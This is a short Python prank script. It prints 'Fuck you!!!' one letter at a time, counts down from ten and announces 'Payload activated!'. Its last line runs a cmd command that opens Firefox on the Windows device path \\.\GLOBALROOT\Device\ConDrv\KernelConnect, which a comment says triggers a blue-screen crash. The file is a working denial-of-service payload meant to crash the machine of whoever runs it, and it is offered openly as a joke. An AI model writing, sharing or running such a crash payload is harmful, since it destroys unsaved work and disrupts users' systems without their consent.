import time
import os

# Print "fuck you!!!"
print("F", end='\r')
time.sleep(.1)
print("Fu", end='\r')
time.sleep(.1)
print("Fuc", end='\r')
time.sleep(.1)
print("Fuck", end='\r')
time.sleep(.1)
print("Fuck ", end='\r')
time.sleep(.1)
print("Fuck y", end='\r')
time.sleep(.1)
print("Fuck yo", end='\r')
time.sleep(.1)
print("Fuck you", end='\r')
time.sleep(.1)
print("Fuck you!", end='\r')
time.sleep(.1)
print("Fuck you!!", end='\r')
time.sleep(.1)
print("Fuck you!!!", end='\r')

# Wait for 10 seconds
print("\n\n10...")
time.sleep(1)
print("9...")
time.sleep(1)
print("8...")
time.sleep(1)
print("7...")
time.sleep(1)
print("6...")
time.sleep(1)
print("5...")
time.sleep(1)
print("4...")
time.sleep(1)
print("3...")
time.sleep(1)
print("2...")
time.sleep(1)
print("1...")
time.sleep(1)
print("Payload activated!")

# Windows BSODs when you enter `\\.\GLOBALROOT\Device\ConDrv\KernelConnect`
# into a browser :3

# Open in browser
os.system("cmd /c start firefox -private \"\\\\.\\GLOBALROOT\\Device\\ConDrv\\KernelConnect\"")
